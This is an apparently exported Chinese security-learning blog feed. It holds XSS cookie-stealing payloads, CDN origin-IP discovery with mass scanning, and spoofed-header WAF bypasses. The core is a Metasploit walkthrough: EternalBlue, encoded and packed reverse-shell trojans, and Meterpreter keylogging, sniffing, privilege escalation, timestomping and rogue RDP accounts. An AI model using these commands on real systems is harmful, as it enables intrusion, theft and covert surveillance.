分离数据包2、16进制工具（HEX）找到头和尾,删除多余数据,另存为.zip3、Wireshark中找到对应通信流，直接另存为.zip,打不开的话，说明混淆了多余数据，还是需要用Hex修正 方案三Wireshark找到对应的数据包后可以直接另存为啊 方案四 用networkminer可以直接提取 https://mp.weixin.qq.com/s/-EmE0O8vclfBv71d2TbJfQ 这里有篇文章你看看 方案五借助mysql来导出 1select 0x504B0304140000000800288DC34C58BD2C542C0500002C0700000E000 into dumpfile &apos;/tmp/1.zip&apos;; 方案六 wireshark可以提取数据流 原生的(文件 -&gt;导出对象) 也可以使用foremost QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查CDN真实IP目前最有效的方法]]></title>
    <url>%2F2019%2F07%2F24%2F54_%E6%9F%A5CDN%E7%9C%9F%E5%AE%9EIP%E7%9B%AE%E5%89%8D%E6%9C%80%E6%9C%89%E6%95%88%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[查CDN真实IP 什么是CDN加速?CDN的全称是 Content Delivery Network，即内容分发网络，这个概念是1998年提出的。当时美国麻省理工大学(MT)的一批研究生通过分析当时 Internet E的网络状况，提出了一套能够实现用户就近访问的解决方案，最终设计并实现了其独有的系统。 CDN有什么作用?CDN基本思路就是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。CDN核心的就是使用户可就近访问网络,取得所需内容，解决网络拥挤的状况，明显提高用户访问网站的响应速度或者用户下载速度。 对用户来说，如果一个网站开启了CDN，用户访问速度或者下载速度相比之前会更快。一般来说,网站开启CDN之后，可以提升用户体验。 QQ群：397745473 CDN对网站有什么好处?首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。 其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。 验证目标网站是否使用了CDN？第一种方法：很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一，多半是使用了CDN， 多地 Ping 网站有： 1234http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/https://www.17ce.com/ 第二种方法：使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。 有 CDN 的示例，如下图： 如何绕过CDN找到目标站点真实IP？一、主动连接我们就是让目标主动暴漏他们的真实P，比如电视剧的黑衣人洗脸要主动摘去面巾。 1、发邮件给我们：(这就是黑衣人洗脸的时候要摘去面巾） 比如注册的时候会有注册连接发送到我们的邮件，然后查看邮件全文源代码或邮件标头就可以了。如果是大站，会有自己的独立的邮件服务器给你发送，那么这个邮件服务器的有可能跟目标Web在一个段上，我们直接一个一个扫，看返回的HTML源代码是否跟web的对的上。 下面给大家分别看一下网页版的126邮箱和QQ邮箱如何得到的源站点目标IP？此方法对于现在很多网站来说几乎都能中招，屡试不爽。 2、还有一个就是RSS邮件阅，都是同上一个原理。因为有些网站我们点击RSS邮件订阅后会给我们发邮件的。 3、利用网站漏洞：比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。 二、查询DNS历史记录1、DNS缓存查询：这里主要是利用管理员疏忽，通过DNS缓存查询，查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有： 12345https://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/https://tools.ipip.net/cdn.php 2、利用SecurityTrails平台（https://securitytrails.com/），攻击者就可以精准的找到真实原始IP，只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。 SecurityTrails平台除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。 三、查询子域名毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。 下面介绍些常用的子域名查找的方法和工具： 12341、https://x.threatbook.cn/2、https://dnsdb.io/zh-cn/3、Google 搜索；例如：用语法&quot;site:baidu.com -www&quot;就能查看除www外的子域名。4、子域名扫描器；这个我就不多说了，这种工具太多了。 四、网络空间搜索引擎最常见的网络空间搜索引擎有钟馗之眼、shodan、fofa搜索。 1231、钟馗之眼：https://www.zoomeye.org/2、Shodan：https://www.shodan.io/3、FOFA：https://fofa.so/ 这里主要是利用网站返回的内容寻找真实原始IP，如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。 只需要浏览网站源代码，寻找独特的代码片段。 在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics、reCAPTCHA、统计）是攻击者经常使用的方法。或者说用title，毕竟竟每个网站的title基本上都是独一无二的。 以fofa为例：可以直接以 title=””来搜索。 再配合最常见的网络空间搜索引擎就可以轻而易举的找到网站的真实的IP。 五、利用SSL证书寻找真实原始IP以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。 为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443（https://136.23.63.44:443）上直接连接到IP时，SSL证书就会被暴露。 此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。 目前Censys工具（https://censys.io/）就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。 Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。 而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。 Censys证书查询搜索步骤如下1、aaa.com 证书的搜索查询参数为：parsed.names：aaa.com 只显示有效证书的查询参数为：tags.raw：trusted 攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。 2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted 3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“Explore”，打开包含多个工具的下拉菜单。 What’s using this certificate? &gt; IPv4 Hosts； 隐藏服务具有SSL证书，要查找它使用的IPv4，只需将”SHA1 fingerprint”（签名证书的sha1值，也就是SHA1指纹）粘贴到Censys平台IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器真实IP。 使用给定的SSL证书查找原始IP可以做很多事情，例如：如果你是执法部门的人员，想要找出一个隐藏在cheesecp5vaogohv.onion下的儿童色情网站。最好的办法，就是找到其原始IP，这样你就可以追踪到其托管的服务器，甚至查到背后的运营商以及金融线索。 六、全网扫描扫描全网开放特定端口的IP，然后获取他们的特定页面的HTM源代码，用这些源代码和目标网站的特定页面的HTM源代码做对比，如果匹配上来了，就很可能是目标网站的真实P，工具匹配会匹配出来很多，最后还是要人工筛选。 1、钟馗之眼、shodan、fofa空间搜索引擎，这里推荐用 https://fofa.so/ 123第一步：打开fofa；第二步：title=&quot;&quot; 得到IP；第三步：再用 ip==&quot;&quot; 做对比。 2、用Zmap扫全网 123wget http://www.ipdeny.com/ipblocks/data/countries/hk.zone #香港IP zmap -w hk.zone -p 80 -B 100M -o hk.res./zgrab -input-file=hk.res -senders=2000 -data-&quot;./http-reg&quot; | grep -E &apos;memberlogin&apos; &gt;&gt; x.txt 1wget -c http://ftp.apnic.net/stats/apnic/delegated-apnic-latest #全网IP,天朝好像扫不到 七、其它一些思路1、利用网站敏感信息：比如 phpinfo. php，这个就要看字典了。 2、国内很多CDN厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实P。 3、搞到CDN账号：社工管理员，搞到CDN的账号。(Ps：我都能社这个了，还不能想办法社目标web的后台账号密码？还不能找到真实IP吗？) QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>查CDN真实IP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker搭建Nessus]]></title>
    <url>%2F2019%2F07%2F22%2F50_%E6%90%AD%E5%BB%BANessus%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>搭建Nessus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss靶场和教程整理]]></title>
    <url>%2F2019%2F07%2F21%2F48_xss%E9%9D%B6%E5%9C%BA%E5%92%8C%E6%95%99%E7%A8%8B%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[xss靶场QQ群：397745473 谷歌的XSS GAME：http://xss-game.appspot.com/ xss挑战之旅：https://zhuanlan.zhihu.com/p/25336395 xss-quiz：http://hpdoger.me/2018/08/02/xss%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E4%B9%8B%E6%80%92%E5%88%B7xss-quiz/ http://test.xss.tv/ http://xss.tv/payload/xss/ https://xss.haozi.me/ http://prompt.ml/0 教程：漏洞银行的https://skills.bugbank.cn/skill.html?type=4 常见XSS1234567891011121314151617181920212223&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; //默认形式&lt;ScrIpT&gt;alert(&quot;xss&quot;)&lt;/SCriPt&gt; //变换大小写&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-- // &lt;!-- 表示的意思是 闭合注释&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--&quot;onclick=&quot;alert(document.cookie)&lt;img src=javascript:alert(&quot;xss&quot;)&gt;&lt;/img //变换形式&lt;img src=j&amp;#97vascript:alert(&quot;xss&quot;)&gt; //使用ASCII表示&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot; &gt; //插入干扰&lt;DIV STYLE=&quot;width:expression(alert(163));&quot;&gt; //其他属性&lt;DIV STYLE=&quot;xss:expr/*XSS*/ession(alert(163))&quot;&gt; //再干扰&lt;img src=&quot;#&quot; onerror=alert(/xss/)&gt; //借用事件&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;// flash跨站 XSS原理xss 原理 :http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html https://www.cnblogs.com/musicmovie/p/3445246.html xss 教程1、【yueyan科普系列】XSS跨站脚本攻击–yueyan 2、存储型XSS的成因及挖掘方法–pkav 3、跨站脚本攻击实例解析–泉哥 4、XSS高级实战教程–心伤的瘦子 5、XSS利用与挖掘-更新版–GAINOVER 6、XSS在线教学–gainover http://xsst.sinaapp.com/example/1-1.php 评论1.可以去推特翻一下xss payloads，上面会不定期放一些xss challenge：https://twitter.com/XssPayloads 2.一些偏基础一点的靶场:alert(1) to winXSS Challengesprompt(1) to win 3.顺便推荐一个xss平台 个人感觉可以 beef 4.这几个靶场其实够了呀，认真搞一遍 然后看一些乌云和hackerone上面的一些xss案例 基本差不多了 5.乌云的 心伤的瘦子 等实战教程 6.用的多了 无非就是在绕过 推荐去关注Twitter的一些绕过 7.XSS_Cheat_Sheet_2018_Edition资料分享，国外20美金 https://www.t00ls.net/viewthread.php?tid=49978 链接: https://pan.baidu.com/s/1zoC-f4h6j0dQKNQXARJh2w 提取码: 8.xss系列教程【更新下载地址】 链接: https://pan.baidu.com/s/1xPQBQZ7o4VwW60HRBP8PEw 提取码: https://www.t00ls.net/viewthread.php?tid=30394 9.第一系列的eval，可以看下这个 http://bobao.360.cn/learning/detail/292.html 10.https://github.com/firesunCN/BlueLotus_XSSReceiver 11.蓝莲花在线搭建的XSS 12.https://paper.seebug.org/376/ 13： 123456789Client-IP: 127.0.0.1X-Client-IP: 127.0.0.1X-Real-IP: 127.0.0.1True-Client-IP: 127.0.0.1X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Forwarded-Host: 127.0.0.1 14：心伤的瘦子 http://www.secevery.com:4321/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90 http://wooyun.2xss.cc/whitehat_detail.php?whitehat=%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90 15：http://xsst.sinaapp.com/example/1-1.php 参考:https://www.t00ls.net/thread-49676-1-1.html QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>xss靶场和教程整理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全意识防范]]></title>
    <url>%2F2019%2F07%2F20%2F42_%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E9%98%B2%E8%8C%83%2F</url>
    <content type="text"><![CDATA[网络安全意识防范 一. 通用计算机安全防护策略 二. 互联网安全防护策略 三.无线网络安全防护策略 四.网上银行安全防护策略 QQ群：397745473 一. 通用计算机安全防护策略 二. 互联网安全防护策略 三.无线网络安全防护策略 四.网上银行安全防护策略 QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>安全意识防范</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web应用程序安全与风险]]></title>
    <url>%2F2019%2F07%2F20%2F43_Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E4%B8%8E%E9%A3%8E%E9%99%A9%2F</url>
    <content type="text"><![CDATA[Web应用程序安全与风险 QQ群：397745473 web 渗透测试学习框架做一个有良心的白帽子漏洞提交： ## 渗透测试方法论 IOS安全测试思维导图: https://www.t00ls.net/viewthread.php?tid=35639 各种安全相关思维导图整理收集:https://github.com/phith0n/Mind-Map 安全思维导图集合 https://www.sec-wiki.com https://github.com/SecWiki/sec-chart https://www.t00ls.net/viewthread.php?tid=51648 超详细渗透测试思维导图https://github.com/iSafeBlue/Mind-Map 在github上的思维导图，大家可以学习一波： [安全相关思维导图整理收集](https://github.com/phith0n/Mind-Map - by p牛 [安全思维导图集合](https://github.com/SecWiki/sec-chart -by SecWiki 这里才是真正的用法https://github.com/sqlmapproject/sqlmap/wiki/Usage QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Web应用程序安全与风险</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[零基础新手如何学好Python]]></title>
    <url>%2F2019%2F07%2F20%2F44_%E9%9B%B6%E5%9F%BA%E7%A1%80%E6%96%B0%E6%89%8B%E5%A6%82%E4%BD%95%E5%AD%A6%E5%A5%BDPython%2F</url>
    <content type="text"><![CDATA[零基础新手如何学好PythonQQ群：397745473 放松心情，抱着玩玩的心态 写程序前，把需要实现的功能大概描述一下，简单地写下来 如果程序比较复杂，可以简单地设计一下程序的架构（例如有哪个模块），然后写下来，或者简单地画出来。 你也可以把程序运行的流程，用简单的语言，把每个step写下来（我很懒，基本不用流程图，因为实际操作很可能要改） 然后你可以根据写下来的东东，从第一个功能开始写。写完第一个，休息一下，看看美女照片，喝杯咖啡，或者听个汪峰什么的，然后再接着写第二个，第三个。。。直到完成整个程序 至于用什么库或工具嘛，哪个能实现你要的东西就用哪个，优先选择简单的，或者你熟悉的。例如你说的BS/Xpath/正规，哪个你比较舒服就用哪个，因为他们做的事情基本差不多，只是手段不同。我的建议是一般情况用Xpath， 遇到比较麻烦的，例如要截取某些特定的信息例如电话号码就用正规。 来源： https://groups.google.com/forum/?utm_medium=email&amp;utm_source=footer#!msg/python-cn/ELYtUKDDhys/G4K-UBHHAwAJ QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[国外比较好用的文件分析系统]]></title>
    <url>%2F2019%2F07%2F20%2F45_%E5%9B%BD%E5%A4%96%E6%AF%94%E8%BE%83%E5%A5%BD%E7%94%A8%E7%9A%84%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[国外比较好用的 文件分析系统 国外比较好用的 文件分析系统 QQ群：397745473 记录一个国外在线比较好用的 文件分析系统： https://app.any.run/ QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web应用程序技术]]></title>
    <url>%2F2019%2F07%2F20%2F46_Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[Web应用程序技术 1、HTTP请求与响应http 超文 本传输协议 get post 请求 QQ群：397745473 http 超文 本传输协议 get post 请求 各种请求头作用的解析利用 比如伪造一些请求头绕过waf QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Web应用程序技术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻防环境搭建]]></title>
    <url>%2F2019%2F07%2F20%2F47_%E6%94%BB%E9%98%B2%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[攻防环境搭建 Windows及Kail安装配置 安全法规定未经授权进行渗透测试是非法的 所以有必要在本地搭建环境进行测试 安装kali linux https://www.kali.org/ 安装PentestBox https://pentestbox.org/zh/ QQ群：397745473 从零开始搭建属于自己的线下AWD平台https://www.t00ls.net/viewthread.php?tid=50956 https://github.com/zhl2008/awd-platform.git 下载镜像 $ sudo docker pull zhl2008/web_14.04 docker 基础学习https://www.t00ls.net/viewthread.php?tid=45091 https://docs.docker.com/ 漏洞练习环境：在windows上可以用 phpstudy 快速度搭建 1.搭建bwapp环境 2.搭建pikachu环境 3.搭建dvwa环境 4.phpcms 5.tomcat + Struts环境搭建 6.jboss攻防环境搭建 7.weblogic攻防环境搭建 使用Vulhub一键搭建漏洞测试靶场https://vulhub.org/#/index/ Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身 docker使用 参考：https://yeasy.gitbooks.io/docker_practice/content/ QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>攻防环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali之MSF渗透测试]]></title>
    <url>%2F2019%2F07%2F20%2F49_kali%E4%B9%8BMSF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[kali 使用中的常见问题关屏保搜 setting –&gt; 电源 –&gt; 从不 kali win10 无法拖拽文件win10 无法再拖文件了，建议用win7 linux 常用传文件的工具有：123456xshell # 需要安装lrzszfilezillawinscpbitvise (推荐)SecureCRTputty sshd 开远程1234PasswordAuthentication yes #限制远程登陆PermitRootLogin yes # 限制root登陆update-rc.d ssh enable #设置开机启动ssh QQ群：397745473 MSFmsf 开发作者H.D.Moore 2003年发布MSF 国际有名的漏洞框架 打开MSF控制台 12345678msfconsole- 1902 exploits 渗透攻击模块- 1072 auxiliary 渗透辅助工具模块- 329 post 执行成功后向目标发送的一些命令 比如提权 hash- 550 payloads 攻击载荷- 44 encoders 编码模块- 10 nops 用于绕过waf工具 搜索使用命令1234567search ms08-067use exploit/windows/smb/ms08_067_netapiinfoset RHOSTS xxx.xxx.xxx.xxxexploit还可以设置payloadsshow payloads 目录结构默认路径：/usr/share/metaspoit-framework modules auxiliary encoders evasion exploits nops payloads post 更新1.替换yum 源 1vim /etc/apt/sources.list 2.加数字签名 12345678910wget -q -O - https://archive.kali.org/archive-key.asc | apt-key addapt remove metasploit-framework升级前先把老的框架卸载清除目录等 apt-get update或msfupdate 常用外部扫描工具aws nessus 绿盟 安恒 ibm 惠普 等 MSF数据库报错解决报错信息： 12[-] ***rting the Metasploit Framework console...\[-] * WARNING: No database support: No database YAML file 解决方法: 123systemctl start postgresqlsystemctl enable postgresqlmsfdb init MSF基本命令irb 启动脚本模式 jobs 显示管理作业 攻击测试ms08-067 ms17-010 QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali之MSF渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模拟器安装Burpsuite的证书]]></title>
    <url>%2F2019%2F07%2F20%2F51_%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%AE%89%E8%A3%85Burpsuite%E7%9A%84%E8%AF%81%E4%B9%A6%2F</url>
    <content type="text"><![CDATA[模拟器安装Burpsuite的证书 QQ群：397745473 开通局域网连接开通方法如图： 在手机里面打开代理的网站 下载证书 重命名证书为cer后导入 QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>模拟器安装Burpsuite的证书</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss_payload记录]]></title>
    <url>%2F2019%2F07%2F20%2F52_xss_payload%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[xss记录 QQ群：397745473 第一个payload1&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 本地用phpstudy搭建一个DVWAPhpStudy 反射型XSS :只能用一次 存储型XSS : 只要访问就会触发XSS XSS 弹cookie1&lt;script&gt;alert(docment.cookie)&lt;/script&gt; XSS 弹用户信息1&lt;script&gt;alert(navigator.userAgent)&lt;/script&gt; XSS 攻击流程xss 分为两种,一种是存储型xss ，另一种是反射型xss 反射型的xss 一般会先装payload链接用短网址加密再诱导别人点击来触发Xss，一般目标比较精准 学习写payload收集了一些XSS payload参考： https://github.com/pgaijin66/XSS-Payloads https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html https://www.jianshu.com/p/01377ad556f0 https://github.com/ismailtasdelen/xss-payload-list QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>xss_payload记录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ms17_010利用案例]]></title>
    <url>%2F2019%2F07%2F20%2F53_ms17_010%E5%88%A9%E7%94%A8%E6%A1%88%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[ms17_010利用案例 Nessus 内部扫描测试到目标主机存在ms17_010 QQ群：397745473 目标信息：1234567Computer : SD-201807251135OS : Windows 7 (Build 7601, Service Pack 1).Architecture : x64System Language : zh_CNDomain : WorkGroupLogged On Users : 1Meterpreter : x64/windows 利用过程：1234567use exploit/windows/smb/ms17_010_eternalblueset rhost 192.168.2.113set lhost 192.168.2.48set payload windows/x64/meterpreter/reverse_tcprunscreenshot # 截屏 执行成功 渗透工具之msfmsf 参考：https://blog.csdn.net/zhalang8324/article/details/77292759 简介它是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。 环境工具：msf4 伪装木马原理：msfvenom是msfpayload,msfencode的结合体,它的优点是单一,命令行,和效率.利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线。 构造shellcode常用命令123msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0b\x27\x36\xce\xc1\x42\xa9\x0d" -f c msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0b\x27\x36\xce\xc1\x42\xa9\x0d" -f python 常用命令1234# 查看帮助msfvenom -h# 查看一个Payload具体需要什么参数?msfvenom -p windows/meterpreter/bind_tcp --payload-options 自己本地生成的bind_tcp的payload并不能在Windows机子上运行 (提示不是可用的Win32程序；如果大家也有遇到这种错误的话，推荐用msfvenom生成c的shellcode 然后自己编译为exe后运行。使用msfvenom –list可以查看所有的payload encoder nops。 设置LHOST,即监听主机IP和LPORT监听端口,我是本地局域网测试,所以IP是192.168.1.152,端口设置成443.所以最后连接会通向192.168.1.152的443端口。 123456789msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.1.152 LPORT=443 -f exe &gt; c.exe# 参数说明：-p payload-e 编码方式-i 编码次数-b 在生成的程序中避免出现的值LHOST,LPORT 监听上线的主机IP和端口-f exe 生成EXE格式 upx加壳说明：upx只是压缩壳工具；如果需要增大破解难度，需要添加加密壳。 1upx -9 c.exe 本机监听因为之前用的是reverse_tcp,所以设置如下： 12msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/meterpreter/reverset_tcp 基本命令123456789101112131415161718192021background # 让meterpreter处于后台模式 sessions -i number # 与会话进行交互，number表示第n个session quit # 退出会话 shell # 获得命令行cat c:\\boot.ini # 查看文件内容 getwd # 查看当前工作目录 work directory upload /root/Desktop/netcat.exe c:\\ # 上传文件到目标机上 download 0xfa.txt /root/Desktop/ # 下载文件到本机上 edit c:\\boot.ini # 编辑文件 search -d d:\\www -f web.config # search 文件 search -f *flag* # 在awd攻防赛的时候很好用ps # 查看当前活跃进程 migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 getpid # 获取当前进程的pid kill pid # 杀死进程 getuid # 查看权限 sysinfo # 查看目标机系统信息，如机器名，操作系统等 getsystem #提权操作timestompc:/a.doc -c "10/27/2015 14:22:11" #修改文件的创建时间 开启3389会新建个账号，并在后面删掉 1234567891011meterpreter &gt; run getgui -u haha -p password[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.[!] Example: run post/windows/manage/enable_rdp OPTION=value [...][*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator[*] Carlos Perez carlos_perez@darkoperator.com[*] Setting user account for logon[*] Adding User: haha with Password: password[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rcmeterpreter &gt; run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rc 迁移进程123meterpreter &gt; ps自行选择PIDmeterpreter &gt; migrate pid 提权操作123456789101112getsystem 大部分都会失败 他只尝试了4个Payload。meterpreter &gt; getuid Server username: Testing\Croxy meterpreter &gt; getsystem [-] priv_elevate_getsystem: Operation failed: Access is denied.使用MS14-058之类的Exp进行提权,利用windows提权漏洞进行提升meterpreter &gt; background[*] Backgrounding session 3..msf exploit(handler) &gt; use exploit/windows/local/ms14_058_track_popup_menumsf exploit(ms14_058_track_popup_menu) &gt; set SESSION 3 获取敏感信息1234567run post/windows/gather/checkvm #是否虚拟机run post/windows/gather/enum_applications #获取安装软件信息run post/windows/gather/dumplinks #获取最近的文件操作run post/windows/gather/enum_ie #获取IE缓存run post/windows/gather/enum_chrome #获取Chrome缓存run scraper #获取常见信息#保存在～/.msf4/logs/scripts/scraper/目录下 键盘记录1234567meterpreter &gt; keyscan_startStarting the keystroke sniffer...meterpreter &gt; keyscan_dumpDumping captured keystrokes...dir &lt;Return&gt; cd &lt;Ctrl&gt; &lt;LCtrl&gt;meterpreter &gt; keyscan_stopStopping the keystroke sniffer... 截屏123456eterpreter &gt; use espiaLoading extension espia...Success.meterpreter &gt; screenscreengrab screenshot meterpreter &gt; screengrab Screenshot saved to: /home/daiker/zQBKZbTv.jpeg 网络嗅探1234567891011121314meterpreter &gt; use snifferLoading extension sniffer...success.meterpreter &gt; sniffer_interfaces 1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false ) 2 - 'Intel(R) PRO/1000 MT Desktop Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false ) 3 - 'Cisco Systems VPN Adapter' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )meterpreter &gt; sniffer_start 2[*] Capture started on interface 2 (50000 packet buffer)meterpreter &gt; sniffer_dump 2 /tmp/test2.cap[*] Flushing packet capture buffer for interface 2...[*] Flushed 1176 packets (443692 bytes)[*] Downloaded 100% (443692/443692)...[*] Download completed, converting to PCAP...[*] PCAP file written to /tmp/test2.cap 域管理员嗅探123456789101112131415161718192021msf exploit(multi/handler) &gt; use post/windows/gather/enum_domainmsf post(windows/gather/enum_domain) &gt; show options Module options (post/windows/gather/enum_domain): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on.msf post(windows/gather/enum_domain) &gt; set session 1session =&gt; 1msf post(windows/gather/enum_domain) &gt; exploit[+] 